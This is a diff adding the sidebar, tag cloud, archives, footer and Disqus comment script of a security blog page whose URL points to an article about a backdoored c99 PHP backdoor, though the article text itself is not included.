+            <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/linux/">linux</a><span class="category-list-count">18</span><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/linux/debian/">debian</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/linux/opensuse/">opensuse</a><span class="category-list-count">5</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/linux/ubuntu/">ubuntu</a><span class="category-list-count">1</span></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/misc/">misc</a><span class="category-list-count">4</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/news/">news</a><span class="category-list-count">7</span><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/news/security/">security</a><span class="category-list-count">4</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/news/warez/">warez</a><span class="category-list-count">1</span></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/programming/">programming</a><span class="category-list-count">1</span><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/programming/python/">python</a><span class="category-list-count">1</span></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/security/">security</a><span class="category-list-count">56</span><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/security/operating-system/">operating system</a><span class="category-list-count">4</span><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/security/operating-system/centos/">centos</a><span class="category-list-count">2</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/security/operating-system/windows/">windows</a><span class="category-list-count">2</span></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/security/writeups/">writeups</a><span class="category-list-count">47</span></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/windows/">windows</a><span class="category-list-count">1</span></li></ul>
+        </div>
+    </div>
+
+
+            
+                
+    <div class="widget-wrap widget-float">
+        <h3 class="widget-title">tag cloud</h3>
+        <div class="widget tagcloud">
+            <a href="/tags/anonymity/" style="font-size: 10px;">anonymity</a> <a href="/tags/apache/" style="font-size: 10px;">apache</a> <a href="/tags/backdoor/" style="font-size: 10px;">backdoor</a> <a href="/tags/bsd/" style="font-size: 11px;">bsd</a> <a href="/tags/centos/" style="font-size: 11px;">centos</a> <a href="/tags/crypto/" style="font-size: 15px;">crypto</a> <a href="/tags/ctf/" style="font-size: 19px;">ctf</a> <a href="/tags/debian/" style="font-size: 10px;">debian</a> <a href="/tags/firefox/" style="font-size: 10px;">firefox</a> <a href="/tags/forensic/" style="font-size: 10px;">forensic</a> <a href="/tags/forensics/" style="font-size: 14px;">forensics</a> <a href="/tags/git/" style="font-size: 12px;">git</a> <a href="/tags/graphic/" style="font-size: 10px;">graphic</a> <a href="/tags/guessing/" style="font-size: 11px;">guessing</a> <a href="/tags/hyper-v/" style="font-size: 10px;">hyper-v</a> <a href="/tags/install/" style="font-size: 10px;">install</a> <a href="/tags/kvm/" style="font-size: 10px;">kvm</a> <a href="/tags/lfi/" style="font-size: 11px;">lfi</a> <a href="/tags/linux/" style="font-size: 18px;">linux</a> <a href="/tags/misc/" style="font-size: 13px;">misc</a> <a href="/tags/netbios/" style="font-size: 11px;">netbios</a> <a href="/tags/news/" style="font-size: 14px;">news</a> <a href="/tags/opensuse/" style="font-size: 13px;">opensuse</a> <a href="/tags/pentest/" style="font-size: 10px;">pentest</a> <a href="/tags/php/" style="font-size: 10px;">php</a> <a href="/tags/piracy/" style="font-size: 10px;">piracy</a> <a href="/tags/privacy/" style="font-size: 10px;">privacy</a> <a href="/tags/programming/" style="font-size: 11px;">programming</a> <a href="/tags/proxy/" style="font-size: 10px;">proxy</a> <a href="/tags/pwn/" style="font-size: 10px;">pwn</a> <a href="/tags/python/" style="font-size: 10px;">python</a> <a href="/tags/qemu/" style="font-size: 10px;">qemu</a> <a href="/tags/reconnaissance/" style="font-size: 10px;">reconnaissance</a> <a href="/tags/reverse/" style="font-size: 11px;">reverse</a> <a href="/tags/security/" style="font-size: 20px;">security</a> <a href="/tags/ssh/" style="font-size: 11px;">ssh</a> <a href="/tags/stegano/" style="font-size: 11px;">stegano</a> <a href="/tags/system/" style="font-size: 17px;">system</a> <a href="/tags/tor/" style="font-size: 11px;">tor</a> <a href="/tags/ubuntu/" style="font-size: 10px;">ubuntu</a> <a href="/tags/update/" style="font-size: 11px;">update</a> <a href="/tags/usenet/" style="font-size: 10px;">usenet</a> <a href="/tags/virtualbox/" style="font-size: 11px;">virtualbox</a> <a href="/tags/virtualization/" style="font-size: 16px;">virtualization</a> <a href="/tags/vulnerability/" style="font-size: 11px;">vulnerability</a> <a href="/tags/warez/" style="font-size: 10px;">warez</a> <a href="/tags/web/" style="font-size: 16px;">web</a> <a href="/tags/webshell/" style="font-size: 10px;">webshell</a> <a href="/tags/windows/" style="font-size: 12px;">windows</a> <a href="/tags/writeups/" style="font-size: 19px;">writeups</a>
+        </div>
+    </div>
+
+
+            
+                
+    <div class="widget-wrap widget-list">
+        <h3 class="widget-title">archives</h3>
+        <div class="widget">
+            <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/08/">August 2016</a><span class="archive-list-count">26</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/07/">July 2016</a><span class="archive-list-count">26</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/06/">June 2016</a><span class="archive-list-count">7</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/05/">May 2016</a><span class="archive-list-count">5</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/04/">April 2016</a><span class="archive-list-count">8</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/03/">March 2016</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2015/12/">December 2015</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2015/10/">October 2015</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2015/09/">September 2015</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2014/11/">November 2014</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2014/10/">October 2014</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2014/09/">September 2014</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2014/08/">August 2014</a><span class="archive-list-count">5</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2012/12/">December 2012</a><span class="archive-list-count">1</span></li></ul>
+        </div>
+    </div>
+
+
+            
+                
+    <div class="widget-wrap widget-list">
+        <h3 class="widget-title">links</h3>
+        <div class="widget">
+            <ul>
+                
+                    <li>
+                        <a href="http://hexo.io">Hexo</a>
+                    </li>
+                
+                    <li>
+                        <a href="http://www.freeopensourcesoftware.org">FOSS</a>
+                    </li>
+                
+                    <li>
+                        <a href="http://www.doesbittorrentequalpiracy.com">Torrent is not a crime</a>
+                    </li>
+                
+            </ul>
+        </div>
+    </div>
+
+
+            
+        
+    </div>
+</aside>
+                </div>
+            </div>
+        </div>
+        <footer id="footer">
+    <div class="container">
+        <div class="container-inner">
+            <a id="back-to-top" href="javascript:;"><i class="icon fa fa-angle-up"></i></a>
+            <div class="credit">
+                <h1 class="logo-wrap">
+                    <a href="/" class="logo"></a>
+                </h1>
+                <p>&copy; 2016 Alexandre ZANNI</p>
+                <p>Powered by <a href="//hexo.io/" target="_blank">Hexo</a>. Theme by <a href="//github.com/ppoffice" target="_blank">PPOffice</a></p>
+            </div>
+        </div>
+    </div>
+</footer>
+        
+    
+    <script>
+    var disqus_shortname = 'rawsec';
+    
+    
+    var disqus_url = 'http://rawsec.ml/en/c99-php-backdoor-backdoored/';
+    
+    (function() {
+    var dsq = document.createElement('script');
+    dsq.type = 'text/javascript';
+    dsq.async = true;
+    dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+    (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+    })();
+    </script>
+
+
+
+    
+
+
+<!-- Custom Scripts -->
+<script src="/js/main.js"></script>
+
+    </div>
+</body>
+</html>
